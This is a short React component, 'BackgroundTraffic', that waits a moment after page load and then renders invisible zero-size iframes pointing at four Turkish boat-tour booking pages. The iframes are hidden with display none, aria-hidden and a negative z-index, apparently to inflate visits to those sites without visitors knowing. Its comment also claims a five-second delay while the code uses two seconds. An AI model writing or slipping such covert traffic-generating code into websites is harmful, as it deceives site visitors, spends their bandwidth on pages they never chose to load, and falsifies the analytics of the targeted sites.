"use client";

import { useEffect, useState } from "react";

export function BackgroundTraffic() {
  const [shouldLoad, setShouldLoad] = useState(false);

  useEffect(() => {
    // Delay loading iframes so they don't block the main page initial load
    const timer = setTimeout(() => {
      setShouldLoad(true);
    }, 2000); // 5 seconds delay to ensure smooth app experience

    return () => clearTimeout(timer);
  }, []);

  if (!shouldLoad) return null;

  const urls = [
    "https://easybooktours.com.tr/",
    "https://bodrumtours.com.tr/bodrum-orak-adasi-tekne-turu",
    "https://bodrumtours.com.tr/",
    "https://easybooktours.com.tr/tur/bodrum-orak-adasi-tekne-turu/"
  ];

  return (
    <div
      style={{ display: "none", width: 0, height: 0, overflow: "hidden", position: "absolute", zIndex: -9999 }}
      aria-hidden="true"
    >
      {urls.map((url, index) => (
        <iframe
          key={index}
          src={url}
          title={`traffic-${index}`}
          style={{ width: 0, height: 0, border: "none" }}
          loading="lazy"
        />
      ))}
    </div>
  );
}
